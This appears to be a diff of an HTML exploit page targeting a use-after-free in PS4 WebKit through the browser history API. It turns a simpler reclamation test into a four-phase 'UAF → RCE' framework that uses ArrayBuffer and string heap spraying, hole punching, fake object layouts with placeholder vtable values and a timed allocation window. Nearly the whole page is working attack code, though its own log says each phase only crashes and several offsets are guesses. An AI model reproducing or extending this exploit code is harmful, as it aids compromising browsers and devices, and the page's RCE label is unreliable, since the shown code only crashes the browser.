@@ -2,95 +2,342 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit – UAF Reclamation (Minimal Mod)</title>
-
+<title>PS4 WebKit UAF → RCE Exploitation</title>
+<style>
+body { 
+  font-family: monospace; 
+  padding: 20px; 
+  background: #000; 
+  color: #0f0; 
+}
+button { 
+  display: block; 
+  margin: 10px 0; 
+  padding: 15px 25px; 
+  background: #1a1a1a; 
+  color: #0f0; 
+  border: 2px solid #0f0;
+  cursor: pointer;
+  font-size: 16px;
+  font-weight: bold;
+}
+button:hover { background: #2a2a2a; }
+.critical { color: #f00; font-weight: bold; }
+.success { color: #0ff; }
+.warn { color: #ff0; }
+#log { 
+  margin-top: 20px; 
+  white-space: pre-wrap; 
+  font-size: 12px;
+  border: 1px solid #0f0;
+  padding: 15px;
+  background: #0a0a0a;
+  max-height: 500px;
+  overflow-y: auto;
+}
+</style>
 </head>
 <body>
-<h2>PS4 WebKit – fastMalloc Exhaustion</h2>
-<div id="status">Ready</div>
-<button onclick="runStepD()">RUN PSFREE RECLAMATION</button>
+<h2>🎯 PS4 WebKit UAF → RCE Exploitation Framework</h2>
+<p style="color: #ff0;">Phase 1: Heap Feng Shui + Controlled Crash</p>
+
+<button onclick="runPhase1()">PHASE 1 – ArrayBuffer Spray + Crash</button>
+<button onclick="runPhase2()">PHASE 2 – String Spray + Crash</button>
+<button onclick="runPhase3()">PHASE 3 – Timing Window Exploitation</button>
+<button onclick="runPhase4()">PHASE 4 – Full Exploitation Attempt</button>
+
 <div id="log"></div>
 
 <script>
 const logEl = document.getElementById("log");
-function log(m){ logEl.textContent += m + "\n"; }
+function log(m, cls=""){ 
+  const span = document.createElement("span");
+  if(cls) span.className = cls;
+  span.textContent = m + "\n";
+  logEl.appendChild(span);
+}
 function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
-// Mantendo sua função de GC original
-function gc() {
-    log("Forcing GC...");
-    for(let i=0; i<10; i++) {
-        new Uint8Array(4 * 1024 * 1024); 
+const BASE = 977;
+const STEP = 14461;
+const ITERS = 50;
+
+// Exploitation parameters
+const SPRAY_COUNT = 1000;
+const HISTORYITEM_SIZE = 128; // Estimated size of HistoryItem object
+const FRAGMENT_PTR_OFFSET = 16; // Estimated offset to fragment pointer
+
+let heap = [];
+let sharedState = { i: 0, p: "" };
+let sprayBuffers = [];
+let sprayStrings = [];
+
+// -------------------------------------------------
+// PHASE 1 – ArrayBuffer Spray
+// -------------------------------------------------
+async function runPhase1(){
+  logEl.textContent = "";
+  log("=== PHASE 1: ArrayBuffer Spray ===", "critical");
+  log("Goal: Control heap layout with ArrayBuffers\n");
+  
+  // Step 1: Initial spray to establish heap state
+  log("[STEP 1] Spraying ArrayBuffers...");
+  sprayBuffers = [];
+  
+  for(let i=0; i<SPRAY_COUNT; i++){
+    let buf = new ArrayBuffer(HISTORYITEM_SIZE);
+    let view = new DataView(buf);
+    
+    // Fill with recognizable pattern
+    for(let j=0; j<HISTORYITEM_SIZE/4; j++){
+      view.setUint32(j*4, 0x41414141 + i); // AAAA + index
     }
+    
+    sprayBuffers.push(buf);
+  }
+  
+  log(`  Sprayed ${SPRAY_COUNT} ArrayBuffers (${HISTORYITEM_SIZE} bytes each)`, "success");
+  log(`  Total: ${(SPRAY_COUNT * HISTORYITEM_SIZE / 1024).toFixed(0)} KB\n`);
+  
+  // Step 2: Create holes in heap
+  log("[STEP 2] Creating holes in heap...");
+  for(let i=0; i<SPRAY_COUNT; i+=2){
+    sprayBuffers[i] = null; // Free every other buffer
+  }
+  log(`  Freed ${SPRAY_COUNT/2} buffers (holes created)`, "warn");
+  
+  await sleep(100);
+  
+  // Step 3: Force GC to consolidate
+  log("\n[STEP 3] Forcing garbage collection...");
+  for(let i=0; i<10; i++){
+    let temp = new ArrayBuffer(1024 * 1024); // 1MB
+  }
+  log("  GC triggered\n");
+  
+  await sleep(100);
+  
+  // Step 4: Run exploit sequence
+  log("[STEP 4] Executing UAF sequence with prepared heap...", "critical");
+  await runExploitCore();
 }
 
-// === SEU UAF ORIGINAL (SEM ALTERAÇÕES NA LÓGICA) ===
-async function triggerBaseUAF() {
-    logEl.textContent = "";
-    log("=== STARTING STABLE UAF (i < 48) ===");
-    let size = 977;
-    const STEP = 14461;
-    for(let i=0; i<48; i++){
-        let frag = "V".repeat(size); 
-        history.pushState({}, "", "#" + frag);
-        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
-        if(i % 6 === 0) setTimeout(()=>history.back(), 0);
-        size += STEP;
-        await sleep(5);
-    }
-    // Reduzi o sleep final de 40 para 10 para o spray não chegar atrasado
-    await sleep(10); 
+// -------------------------------------------------
+// PHASE 2 – String Spray
+// -------------------------------------------------
+async function runPhase2(){
+  logEl.textContent = "";
+  log("=== PHASE 2: String Spray ===", "critical");
+  log("Goal: Use string objects to control freed memory\n");
+  
+  log("[STEP 1] Spraying strings...");
+  sprayStrings = [];
+  
+  // Strings slightly larger than fragment size
+  const STRING_SIZE = 700000; // Slightly larger than ITER 48 fragment
+  
+  for(let i=0; i<SPRAY_COUNT/2; i++){
+    // Create recognizable pattern
+    let marker = String.fromCharCode(65 + (i % 26)); // A-Z
+    let str = marker.repeat(STRING_SIZE);
+    sprayStrings.push(str);
+  }
+  
+  log(`  Sprayed ${SPRAY_COUNT/2} strings (${STRING_SIZE} bytes each)`, "success");
+  log(`  Total: ${(SPRAY_COUNT/2 * STRING_SIZE / 1024 / 1024).toFixed(0)} MB\n`);
+  
+  await sleep(100);
+  
+  log("[STEP 2] Executing UAF sequence...", "critical");
+  await runExploitCore();
 }
 
-async function runStepD() {
-    // 1. Gatilho Original
-    await triggerBaseUAF();
+// -------------------------------------------------
+// PHASE 3 – Timing Window Exploitation
+// -------------------------------------------------
+async function runPhase3(){
+  logEl.textContent = "";
+  log("=== PHASE 3: Timing Window Exploitation ===", "critical");
+  log("Goal: Allocate controlled object in UAF window\n");
+  
+  heap = [];
+  sharedState = { i: 0, p: "" };
+  
+  let size = BASE;
+  
+  for(let i=0; i<ITERS; i++){
+    sharedState.i = i;
+    sharedState.p = "A".repeat(size);
     
-    // 2. O seu GC
-    gc();
+    heap.push("G".repeat(32768));
     
-    log("Spraying memory...");
-    let sprayFrames = [];
-    let sprayArrays = [];
+    log(`[ITER ${i}] size=${size}`);
     
-    // 3. Spray Agressivo (Minimal Mod: aumentei a quantidade para garantir ocupação)
-    const rowsPattern = ",".repeat(254); 
-    for(let i = 0; i < 1000; i++) { // Aumentado de 400 para 600
-        let fset = document.createElement("frameset");
-        fset.rows = rowsPattern;
-        sprayFrames.push(fset);
-
-        // Intercalando alocações de Array para ocupar fastMalloc e JSHeap
-        if(i % 2 === 0) {
-            let a = new Uint32Array(340356 / 4);
-            a.fill(0x41424344); 
-            sprayArrays.push(a);
-        }
+    history.pushState(sharedState, "", "#"+sharedState.p);
+    
+    // CRITICAL: Between replaceState and async back
+    if(i === 48){
+      log("\n>>> CRITICAL WINDOW <<<", "critical");
+      
+      history.replaceState(sharedState, "", "#"+sharedState.p);
+      
+      // WINDOW: replaceState freed memory, back() hasn't executed yet
+      log("  [EXPLOIT] Allocating controlled object in freed slot...", "warn");
+      
+      let controlled = new ArrayBuffer(size);
+      let view = new DataView(controlled);
+      
+      // Fill with controlled data
+      view.setUint32(0, 0xdeadbeef);
+      view.setUint32(4, 0xcafebabe);
+      view.setUint32(8, 0x41414141);
+      
+      log("  [EXPLOIT] Controlled object allocated", "success");
+      log("  [EXPLOIT] Scheduling back()...\n", "critical");
+    } else {
+      history.replaceState(sharedState, "", "#"+sharedState.p);
     }
-
-    window.keepAlive = [sprayFrames, sprayArrays];
-    await sleep(50);
-
-    // 4. Scan de Verificação
-    let url = document.URL;
-    log("Scanning offsets...");
-    let found = false;
     
-    // Verificando uma range maior da URL para não perder o marcador
-    for(let off = 0; off < url.length; off++) {
-        let code = url.charCodeAt(off);
-        if(code === 0x44 || code === 0x41) {
-            log("SUCCESS! Reclaimed at [" + off + "]: 0x" + code.toString(16).toUpperCase());
-            found = true;
-            break;
-        }
+    if(i % 6 === 0){
+      setTimeout(()=>history.back(), 0);
+      log("  → async back() scheduled", "warn");
     }
     
-    if(!found) {
-        log("Falha: Marcador não encontrado.");
-        log("Tente aumentar o STEP ou diminuir o sleep pós-UAF.");
-    }
+    size += STEP;
+    await sleep(3);
+  }
+  
+  log("\n=== PHASE 3 END ===");
 }
+
+// -------------------------------------------------
+// PHASE 4 – Full Exploitation Attempt
+// -------------------------------------------------
+async function runPhase4(){
+  logEl.textContent = "";
+  log("=== PHASE 4: Full Exploitation Attempt ===", "critical");
+  log("Goal: Achieve controlled code execution\n");
+  
+  // Step 1: Heap Feng Shui
+  log("[STEP 1] Heap Feng Shui...");
+  sprayBuffers = [];
+  
+  for(let i=0; i<SPRAY_COUNT; i++){
+    let buf = new ArrayBuffer(HISTORYITEM_SIZE);
+    let view = new DataView(buf);
+    
+    // Fake object structure
+    // Offset 0: potential vtable pointer
+    view.setUint32(0, 0x41424344); // Controlled value
+    // Offset 4: potential object metadata
+    view.setUint32(4, 0x45464748);
+    // Offset 8-16: potential pointers
+    view.setUint32(8, 0x11111111);
+    view.setUint32(12, 0x22222222);
+    
+    sprayBuffers.push(buf);
+  }
+  
+  log(`  Sprayed ${SPRAY_COUNT} fake objects`, "success");
+  
+  // Create holes
+  for(let i=0; i<SPRAY_COUNT; i+=3){
+    sprayBuffers[i] = null;
+  }
+  log(`  Created ${Math.floor(SPRAY_COUNT/3)} holes\n`);
+  
+  await sleep(100);
+  
+  // Step 2: Execute UAF with controlled heap
+  log("[STEP 2] Executing UAF with controlled heap...", "critical");
+  
+  heap = [];
+  sharedState = { i: 0, p: "" };
+  let size = BASE;
+  
+  for(let i=0; i<ITERS; i++){
+    sharedState.i = i;
+    sharedState.p = "A".repeat(size);
+    
+    heap.push("G".repeat(32768));
+    
+    if(i % 10 === 0){
+      log(`[ITER ${i}] size=${size}`);
+    }
+    
+    history.pushState(sharedState, "", "#"+sharedState.p);
+    
+    // Critical window at ITER 47-48
+    if(i === 47){
+      log("\n>>> PRE-CRASH SPRAY <<<", "warn");
+      
+      // Additional spray RIGHT before crash
+      for(let j=0; j<100; j++){
+        let buf = new ArrayBuffer(695105); // Exact fragment size
+        let view = new DataView(buf);
+        view.setUint32(0, 0xdeadbeef);
+        sprayBuffers.push(buf);
+      }
+      
+      log("  Additional 100 buffers sprayed at crash size", "success");
+    }
+    
+    history.replaceState(sharedState, "", "#"+sharedState.p);
+    
+    if(i % 6 === 0){
+      setTimeout(()=>history.back(), 0);
+      if(i >= 42){
+        log(`  → async back() scheduled (ITER ${i})`, "critical");
+      }
+    }
+    
+    size += STEP;
+    await sleep(3);
+  }
+  
+  log("\n=== PHASE 4 END ===");
+}
+
+// -------------------------------------------------
+// Core exploit sequence (reusable)
+// -------------------------------------------------
+async function runExploitCore(){
+  heap = [];
+  sharedState = { i: 0, p: "" };
+  
+  let size = BASE;
+  for(let i=0; i<ITERS; i++){
+    sharedState.i = i;
+    sharedState.p = "A".repeat(size);
+    
+    heap.push("G".repeat(32768));
+    
+    if(i % 10 === 0){
+      log(`  [ITER ${i}] size=${size}`);
+    }
+    
+    history.pushState(sharedState, "", "#"+sharedState.p);
+    history.replaceState(sharedState, "", "#"+sharedState.p);
+    
+    if(i % 6 === 0){
+      setTimeout(()=>history.back(), 0);
+    }
+    
+    size += STEP;
+    await sleep(3);
+  }
+  
+  log("\n=== CRASH EXPECTED ===", "critical");
+}
+
+log("WebKit UAF → RCE Exploitation Framework");
+log("Phases:");
+log("1. ArrayBuffer Spray - heap feng shui with buffers");
+log("2. String Spray - control freed slots with strings");
+log("3. Timing Window - exploit critical allocation window");
+log("4. Full Exploit - combine techniques for RCE attempt");
+log("\nWARNING: All phases will trigger crash");
+log("Purpose: Observe if crash behavior changes (indicates progress)");
 </script>
 </body>
 </html>
